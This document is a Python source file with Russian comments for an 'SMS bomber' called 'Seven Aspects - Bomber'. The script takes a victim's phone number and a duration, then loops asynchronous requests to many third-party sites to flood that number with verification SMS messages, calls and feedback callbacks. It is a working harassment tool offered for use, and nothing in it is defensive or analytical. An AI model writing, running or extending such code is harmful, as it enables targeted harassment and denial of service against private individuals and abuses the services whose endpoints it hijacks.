"""
    Импорт модулей
"""
from Attack.Services import urls # Импортируем функцию с адресами и информацией о сайтах с смс-бомберами
from Attack.Feedback_Services import feedback_urls # Импортируем функцию с адресами и информацией о сайтах с прочими бомберами
import time, os, requests # Импортируем модули для задержки, работы с ОС и запросов на сайты
from asyncio import ensure_future, gather, run # Импортируем функции для работы с асинхранными функциями
from Attack.functions import Color, set_title, clear, waiting, animate_message, get_time, center_text, stop, confirm, System, check_update, check_connection # Импортируем вспомогательные функции и классы для работы програмы

"""
    Обьявляем классы
"""
color = Color('\033') # Класс для использования цвета в командной строке
project = System() # Класс с системными значениями

"""
    Основной код програмы
"""
clear()
if check_connection(): # Проверяем наличие подключения к интернету
    animate_message("\n\n\n\nПодключение к интернету установлено\n\n", color.green)
else:
    animate_message("\n\n\n\nПодключение к серверу не установлено\n\n", color.red)
    quit()
check_update() # Проверяем наличие обновлений
set_title("Seven Aspects - Bomber") # Переименновываем окно командной строки
try:
    import keyboard, aiohttp
    from aiohttp import ClientSession
except:
    if confirm(f"\n\n\n Вам необходимо установить модули keyboard и aiohttp, введите {color.color_message('Y', color.green)} если вы согласы и {color.color_message('n', color.red)} если не согласны. Введите (Y/n): "):
        pass
    else:
        animate_message("\n\n\n\nВы отказались устанавливать необходимые модули", color.red)
        quit()
    clear()
    animate_message("\n\n Скачивание модуля...\n")
    os.system("pip install keyboard aiohttp")

debug = True
try:
    clear()
    while True:
        animate_message("\n\n\n\n Введите номер телефона и время выполнения в секундах (для выхода введите 0):\n")
        message = input(f'{color.red}~# {color.rgb_color(161, 161, 161)}').replace('+', '').replace('-', '').replace('(', '').replace(')', '')
        print(color.reset)
        if message == '0': break
        count_true = 0
        count_false = 0
        number = ''.join(message.split()[:-1])
        for i in ['+', '-', '(', ')']: number = number.replace(i, '')
        conf = 'mix'
        try: 
            attack_duration = int(message.split()[-1])
            if len(message.split()) >= 2 and attack_duration >= 20:
                async def request(session, url, conf):
                    global count_false, count_true
                    try:
                        type_attack = ('SMS', 'CALL', 'FEEDBACK')
                        if url['info']['attack'] in type_attack:
                            async with session.request( url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
                                start_time = time.time()  # Начальное время
                                end_time = start_time + attack_duration
                                if time.time() >= end_time: return
                                count_true += 1
                                
                                if debug: print(f"{get_time()} {color.color_message('|', color.white)} {color.color_message(center_text(url['info']['website']), color.yellow)} {color.color_message('|', color.white)} {color.color_message("SUCCES", color.green)}")
                                return await response.text()
                    except Exception as e:
                        count_false += 1
                        if debug: print(f"{get_time()} {color.color_message('|', color.white)} {color.color_message(center_text(url['info']['website']), color.yellow)} {color.color_message('|', color.white)} {color.color_message("ERROR", color.red)}")

                async def async_attacks(number, conf):
                    async with ClientSession() as session:
                        services = (urls(number) + feedback_urls(number)) if conf in ['feedback', 'mix'] else urls(number)
                        tasks = [ensure_future(request(session, service, conf)) for service in services]
                        await gather(*tasks)

                async def run_attacks():
                    global count_true, count_false
                    start_time = time.time()
                    end_time = start_time + attack_duration
                    while time.time() < end_time: await async_attacks(number, conf)
                try:
                    if urls(number) or len(number) > 10:
                        time_start = time.time()
                        print(f"Вы успешно запустили бомбер на номер {number} на +-{attack_duration} секунд\n")
                        run(run_attacks())
                        time_stop = time.time()
                        work_time = f'{time_stop - time_start:.2f}'
                        # Вывод результатов
                        print(f'''
        Результаты выполнения атаки:

            Время выполнения атаки: {color.color_message(work_time, color.green)} секунд,
            Успешно посещенных сайтов: {color.color_message(count_true, color.green)},
            Не посещенных сайтов: {color.color_message(count_false, color.red)}
        ''')
                        waiting()
                        clear()
                    else:
                        print("Вы ввели неверный номер телеф1она!")
                        waiting()
                        clear()
                except KeyboardInterrupt:
                    stop()
                except Exception as e:
                    print("Вы ввели неверный номер телефона!")
                    waiting()
                    clear()
                    

            else:
                print("Время бомбера не должно быть меньше 20с")
                waiting()
                clear()
        except KeyboardInterrupt:
            stop()
        except Exception:
            print("\nВы ввели неверный номер телефона!")
            waiting()
            clear()
except KeyboardInterrupt:
    stop()
except Exception:
    check_update(True)
    quit()
